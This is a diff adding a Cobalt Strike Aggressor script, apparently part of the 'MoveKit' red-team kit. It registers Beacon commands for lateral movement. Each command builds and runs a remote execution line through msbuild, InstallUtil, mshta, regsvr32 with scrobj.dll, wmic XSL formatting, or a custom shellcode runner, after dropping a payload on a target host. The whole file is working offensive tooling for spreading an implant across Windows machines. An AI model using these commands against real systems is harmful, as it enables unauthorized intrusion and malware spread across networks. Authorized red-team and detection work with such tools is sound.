@@ -1,0 +1,277 @@
+#
+#
+# MoveKit - Move Commands
+# by: @0xthirteen
+#
+#
+
+
+#---------------------------------------------
+#Beacon Commands
+#---------------------------------------------
+beacon_command_register("move-msbuild", "lateral movement with msbuild",
+	"Usage: msbuild-file [target] [listener] [dropping-filename]\n\n" .
+	"Creates an msbuild file, drops on target host and executes on remote host for lateral movement\n - Values specified in defaults are used, update in menu if needed");
+
+beacon_command_register("move-installutil", "lateral movement with installutil",
+	"Usage: installutil-file [target] [listener] [dropping-filename]\n\n" .
+	"Creates an installutil file, drops on target host and executes on remote host for lateral movement\n - Values specified in defaults are used, update in menu if needed");
+
+beacon_command_register("move-mshta", "lateral movement with mshta",
+	"Usage: mshta-file [target] [listener] [dropping-filename]\n\n" .
+	"Creates an hta file, drops on target host and executes on remote host for lateral movement\n - Values specified in defaults are used, update in menu if needed");
+
+beacon_command_register("move-regsvr32", "lateral movement with regsvr32",
+	"Usage: regsvr32-file [target] [listener] [dropping-filename]\n\n" .
+	"Creates an regsvr32 file, drops on target host and executes on remote host for lateral movement\n - Values specified in defaults are used, update in menu if needed");
+
+beacon_command_register("move-wmic", "lateral movement with wmic",
+	"Usage: wmic-file [target] [listener] [dropping-filename]\n\n" .
+	"Creates an wmic file, drops on target host and executes on remote host for lateral movement\n - Values specified in defaults are used, update in menu if needed");
+
+beacon_command_register("move-nonpre-custom-file", "lateral movement with custom file",
+	"Usage: nonpre-custom-file [target] [listener] [dropping-filename]\n\n" .
+	"Creates an shellcode runner, drops on target host and executes on remote host for lateral movement\n - Values specified in defaults are used, update in menu if needed");
+
+beacon_command_register("move-pre-custom-file", "lateral movement with prebuilt file",
+	"Usage: pre-custom-file [target] [local-file-location] [dropping-filename]\n\n" .
+	"Takes your payload, drops on target host and executes on remote host for lateral movement\n - Values specified in defaults are used, update in menu if needed");
+
+#beacon_remote_exec_method_register("mk-wmi", "Remote execute via SharpMove WMI method (.NET)", &<function>);
+#beacon_remote_exec_method_register("mk-rdp", "Remote execute via SharpRDP RDP method (.NET)", &<function>);
+#beacon_remote_exec_method_register("mk-scm", "Remote execute via SharpMove SCM method (.NET)", &<function>);
+#beacon_remote_exec_method_register("mk-dcom", "Remote execute via SharpMove DCOM method (.NET)", &<function>);
+#beacon_remote_exec_method_register("mk-scheduledtask", "Remote execute via SharpMove Scheduled Task method (.NET)", &<function>);
+#bremote_exec
+
+alias move-msbuild {
+	local('$payloadtype $compile $descname $exectemplate $defaults $latcommand');
+	$payloadtype = "raw";
+	$compile = "false";
+	$descname = "MSBuild Lateral Movement";
+	$exectemplate = "msbuild.csproj";
+	$defaults = %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.csproj", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]);
+	if ($3 is $null) {
+		berror($bid, "\c4Error: Please specify a listener");
+		exit();
+	}
+	if($4 is $null){
+		$4 = "moveme.csproj";
+	}
+	$defaults["bid"] = $1;
+	$defaults["computername"] = $2;
+	$defaults["listener"] = $3;
+	$defaults["filename"] = $4;
+	&moveKit::prechecks($defaults["bid"], $defaults["listener"], $descname, $null, $defaults["droptype"], $defaults["location"], $2, $defaults["filename"], $defaults["cmdtrigger"], $defaults["auto"]);
+	if($defaults['x86'] eq "false"){
+		$cmdarch = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe ";
+	}
+	else {
+		$cmdarch = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe ";
+	}
+	if(($defaults['cmdtrigger'] eq "SCM") || ($defaults['cmdtrigger'] eq "ModifyService")){
+		$latcommand = "C:\\WINDOWS\\System32\\cmd.exe /c ". $cmdarch . "" . $defaults['droplocation'] ."\\" . $defaults['filename'] . "";
+		&moveKit::bearings($defaults, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}
+	else{
+		$latcommand = "". $cmdarch . "" . $defaults['droplocation'] ."\\" . $defaults['filename'] . "";
+		&moveKit::bearings($defaults, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}
+}
+
+alias move-installutil {
+	local('$payloadtype $compile $descname $exectemplate $defaults $latcommand $extras');
+	$payloadtype = "raw";
+	$compile = "true";
+	$descname = "InstallUtil Lateral Movement";
+	$exectemplate = "installutil.cs";
+	$defaults = %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.exe", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]);
+	if ($3 is $null) {
+		berror($bid, "\c4Error: Please specify a listener");
+		exit();
+	}
+	if($4 is $null){
+		$4 = "moveme.exe";
+	}
+	$defaults["bid"] = $1;
+	$defaults["computername"] = $2;
+	$defaults["listener"] = $3;
+	$defaults["filename"] = $4;
+	&moveKit::prechecks($defaults['bid'], $defaults['listener'], $descname, $null, $defaults['droptype'], $defaults['location'], $2, $defaults['filename'], $defaults['cmdtrigger'], $defaults["auto"]);
+	if($defaults['x86'] eq "false"){
+		$cmdarch = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe ";
+	}
+	else {
+		$cmdarch = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe ";
+	}
+	$extras = "/logfile= /LogToConsole=false /U ";
+
+	if(($defaults['cmdtrigger'] eq "SCM") || ($defaults['cmdtrigger'] eq "ModifyService")){
+		$latcommand = "C:\\WINDOWS\\System32\\cmd.exe /c ". $cmdarch . "$extras" . $defaults['droplocation'] ."\\" . $defaults['filename'] . " ";
+		&moveKit::bearings($defaults, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}
+	else{
+		$latcommand = "". $cmdarch . "$extras" . $defaults['droplocation'] ."\\" . $defaults['filename'] . " ";
+		&moveKit::bearings($defaults, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}
+}
+
+alias move-mshta {
+	local('$payloadtype $compile $descname $exectemplate $defaults $latcommand');
+	$payloadtype = "raw";
+	$compile = "false";
+	$descname = "MSHTA Lateral Movement";
+	$exectemplate = "mshta.hta";
+	$defaults = %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.hta", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]);
+	if ($3 is $null) {
+		berror($bid, "\c4Error: Please specify a listener");
+		exit();
+	}
+	if($4 is $null){
+		$4 = "moveme.hta";
+	}
+	$defaults["bid"] = $1;
+	$defaults["computername"] = $2;
+	$defaults["listener"] = $3;
+	$defaults["filename"] = $4;
+	&moveKit::prechecks($defaults["bid"], $defaults["listener"], $descname, $null, $defaults["droptype"], $defaults["location"], $2, $defaults["filename"], $defaults["cmdtrigger"], $defaults["auto"]);
+	if($defaults['x86'] eq "false"){
+		$cmdarch = "C:\\Windows\\System32\\mshta.exe ";
+	}
+	else {
+		$cmdarch = "C:\\Windows\\SysWOW64\\mshta.exe ";
+	}
+	if(($defaults['cmdtrigger'] eq "SCM") || ($defaults['cmdtrigger'] eq "ModifyService")){
+		$latcommand = "C:\\WINDOWS\\System32\\cmd.exe /c ". $cmdarch . "" . $defaults['droplocation'] ."\\" . $defaults['filename'] . " ";
+		&moveKit::bearings($defaults, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}
+	else{
+		$latcommand = "". $cmdarch . "" . $defaults['droplocation'] ."\\" . $defaults['filename'] . " ";
+		&moveKit::bearings($defaults, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}
+}
+
+alias move-regsvr32 {
+	local('$payloadtype $compile $descname $exectemplate $defaults $latcommand');
+	$payloadtype = "raw";
+	$compile = "false";
+	$descname = "RegSvr32 Lateral Movement";
+	$exectemplate = "regsvr32.sct";
+	$defaults = %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.sct", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]);
+	if ($3 is $null) {
+		berror($bid, "\c4Error: Please specify a listener");
+		exit();
+	}
+	if($4 is $null){
+		$4 = "moveme.sct";
+	}
+	$defaults["bid"] = $1;
+	$defaults["computername"] = $2;
+	$defaults["listener"] = $3;
+	$defaults["filename"] = $4;
+	&moveKit::prechecks($defaults["bid"], $defaults["listener"], $descname, $null, $defaults["droptype"], $defaults["location"], $2, $defaults["filename"], $defaults["cmdtrigger"], $defaults["auto"]);
+	if($defaults['x86'] eq "false"){
+		$cmdarch = "C:\\Windows\\System32\\regsvr32.exe ";
+	}
+	else {
+		$cmdarch = "C:\\Windows\\SysWOW64\\regsvr32.exe ";
+	}
+	if(($defaults['cmdtrigger'] eq "SCM") || ($defaults['cmdtrigger'] eq "ModifyService")){
+		$latcommand = "C:\\WINDOWS\\System32\\cmd.exe /c ". $cmdarch . "/s /u /i:" . $defaults['droplocation'] ."\\" . $defaults['filename'] . " scrobj.dll ";
+		&moveKit::bearings($defaults, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}
+	else{
+		$latcommand = "". $cmdarch . "/s /u /i:" . $defaults['droplocation'] ."\\" . $defaults['filename'] . " scrobj.dll ";
+		&moveKit::bearings($defaults, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}
+}
+
+alias move-wmic {
+	local('$payloadtype $compile $descname $exectemplate $defaults $latcommand');
+	$payloadtype = "raw";
+	$compile = "false";
+	$descname = "WMIC Lateral Movement";
+	$exectemplate = "wmic.xsl";
+	$defaults = %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.xsl", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]);
+	if ($3 is $null) {
+		berror($bid, "\c4Error: Please specify a listener");
+		exit();
+	}
+	if($4 is $null){
+		$4 = "moveme.xsl";
+	}
+	$defaults["bid"] = $1;
+	$defaults["computername"] = $2;
+	$defaults["listener"] = $3;
+	$defaults["filename"] = $4;
+	&moveKit::prechecks($defaults["bid"], $defaults["listener"], $descname, $null, $defaults["droptype"], $defaults["location"], $2, $defaults["filename"], $defaults["cmdtrigger"], $defaults["auto"]);
+	if($defaults['x86'] eq "false"){
+		$cmdarch = "C:\\Windows\\System32\\wbem\\wmic.exe ";
+	}
+	else {
+		$cmdarch = "C:\\Windows\\SysWOW64\\wbem\\wmic.exe ";
+	}
+	if(($defaults['cmdtrigger'] eq "SCM") || ($defaults['cmdtrigger'] eq "ModifyService")){
+		$latcommand = "C:\\WINDOWS\\System32\\cmd.exe /c ". $cmdarch . "os get name /FORMAT:" . $defaults['droplocation'] ."\\" . $defaults['filename'] . " ";
+		&moveKit::bearings($defaults, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}
+	else{
+		$latcommand = "". $cmdarch . "os get name /FORMAT:" . $defaults['droplocation'] ."\\" . $defaults['filename'] . " ";
+		&moveKit::bearings($defaults, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}
+}
+
+alias move-nonpre-custom-file {
+	local('$payloadtype $compile $descname $exectemplate $defaults $latcommand');
+	$payloadtype = "raw";
+	$compile = "true";
+	$descname = "NonPreBuiltCustom Lateral Movement";
+	$exectemplate = "custom-nonpre.cs";
+	$defaults = %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.exe", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]);
+	if ($3 is $null) {
+		berror($bid, "\c4Error: Please specify a listener");
+		exit();
+	}
+	if($4 is $null){
+		$4 = "moveme.exe";
+	}
+	$defaults["bid"] = $1;
+	$defaults["computername"] = $2;
+	$defaults["listener"] = $3;
+	$defaults["filename"] = $4;
+	&moveKit::prechecks($defaults["bid"], $defaults["listener"], $descname, $null, $defaults["droptype"], $defaults["location"], $2, $defaults["filename"], $defaults["cmdtrigger"], $defaults["auto"]);
+	$latcommand = "". $defaults['droplocation'] ."\\" . $defaults['filename'] . " ";
+	if($3['cmdtrigger'] eq "SCM"){
+		$exectemplate = "service-custom-nonpre.cs";
+	}
+	&moveKit::bearings($defaults, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+}
+
+alias move-pre-custom-file {
+	local('$payloadtype $compile $descname $exectemplate $defaults $latcommand');
+	$payloadtype = "custom";
+	$compile = "";
+	$descname = "PreBuiltCustom Lateral Movement";
+	$exectemplate = "";
+	$defaults = %(bid => "", file => %moveKit::movedefaults["file"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.exe", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", override => %moveKit::movedefaults["override"], auto => %moveKit::movedefaults["auto"], droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], amsi => %moveKit::movedefaults["amsi"]);
+	if ($3 is $null) {
+		berror($bid, "\c4Error: Please specify a premade local file");
+		exit();
+	}
+	if($4 is $null){
+		$4 = "moveme.exe";
+	}
+	$defaults["bid"] = $1;
+	$defaults["computername"] = $2;
+	$defaults["file"] = $3;
+	$defaults["filename"] = $4;
+
+	&moveKit::prechecks($defaults["bid"], "", $descname, $null, $defaults["droptype"], $defaults["location"], $2, $defaults["filename"], $defaults["cmdtrigger"], $defaults["auto"]);
+	if(%moveKit::movedefaults["override"] eq ""){
+		$latcommand = "". $defaults['droplocation'] ."\\" . $defaults['filename'] . " ";
+	}
+	else{
+		$latcommand = %moveKit::movedefaults["override"];
+	}
+	&moveKit::bearings($defaults, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+}
